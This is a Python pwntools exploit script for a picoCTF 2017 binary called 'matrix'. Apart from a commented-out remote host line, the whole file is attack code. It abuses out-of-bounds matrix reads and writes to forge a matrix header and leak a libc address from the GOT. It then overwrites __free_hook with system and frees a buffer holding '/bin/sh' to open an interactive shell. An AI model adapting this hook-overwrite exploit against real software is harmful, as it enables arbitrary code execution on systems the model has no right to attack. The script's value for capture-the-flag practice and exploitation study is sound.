#!/usr/bin/env python3

import pwn, struct

remote = pwn.process('./matrix')
#remote = pwn.remote('shell2017.picoctf.com', 13265)
remote.recvuntil('Enter command: ')

def flt2int(flt):
	return struct.unpack('<I', struct.pack('f', flt))[0] 

def int2flt(num):
	return struct.unpack('f', struct.pack('<I', num))[0]

def byte2flt(byte):
	return struct.unpack('f', byte)[0]

def get_index(data, col):
	data //= 4
	return data // col, data % col

def matrix_create(r, c):
	remote.sendline('create {0} {1}'.format(r, c))
	remote.recvuntil('Enter command: ')
	print('Finish command: \'create {0} {1}\''.format(r, c))

def matrix_get(i, r, c):
	remote.sendline('get {0} {1} {2}'.format(i, r, c))
	remote.recvuntil(' = ')
	data = remote.recvline(keepends = False)
	remote.recvuntil('Enter command: ')
	print('Finish command: \'get {0} {1} {2}\''.format(i, r, c))
	return flt2int(float(data))

def matrix_set(i, r, c, v):
	remote.sendline('set {0} {1} {2} {3}'.format(i, r, c, v))
	remote.recvuntil('Enter command: ')
	print('Finish command: \'set {0} {1} {2} {3}\''.format(i, r, c, v))

def matrix_destroy(i):
	remote.sendline('destroy {0}'.format(i))
	#remote.recvuntil('Enter command: ')
	print('Finish command: \'destroy {0}\''.format(i))

matrix_global = 0x804b080
setbuf_got = 0x804afc8

"""
setbuf_offset = 0x6b350
__free_hook_offset = 0x1aa8b8
system_offset = 0x3e3e0

"""
setbuf_offset = 0x6f8b0
__free_hook_offset = 0x1db8d0
system_offset = 0x3eb30

num = 32
max_side = 10000
side = 2 ** 15

# get a NULL pointer from calloc
for _ in range(num):
	matrix_create(max_side, max_side)

matrix_set(num - 1, *get_index(matrix_global, max_side), int2flt(matrix_global + 4 * 4))
matrix_set(num - 1, *get_index(matrix_global + 4 * 4, max_side), int2flt(side))
matrix_set(num - 1, *get_index(matrix_global + 4 * 5, max_side), int2flt(side))
matrix_set(num - 1, *get_index(matrix_global + 4 * 6, max_side), int2flt(0))

setbuf_libc = matrix_get(0, *get_index(setbuf_got, side))

print(hex(setbuf_libc))

libc_base = setbuf_libc - setbuf_offset
__free_hook_libc = libc_base + __free_hook_offset
system_libc = libc_base + system_offset
print(hex(system_libc))
print(hex(__free_hook_libc))
matrix_set(0, *get_index(__free_hook_libc, side), int2flt(system_libc))

matrix_set(1, 0, 0, byte2flt(b'/bin'))
matrix_set(1, 0, 1, byte2flt(b'/sh\0'))

matrix_destroy(1)

remote.interactive()
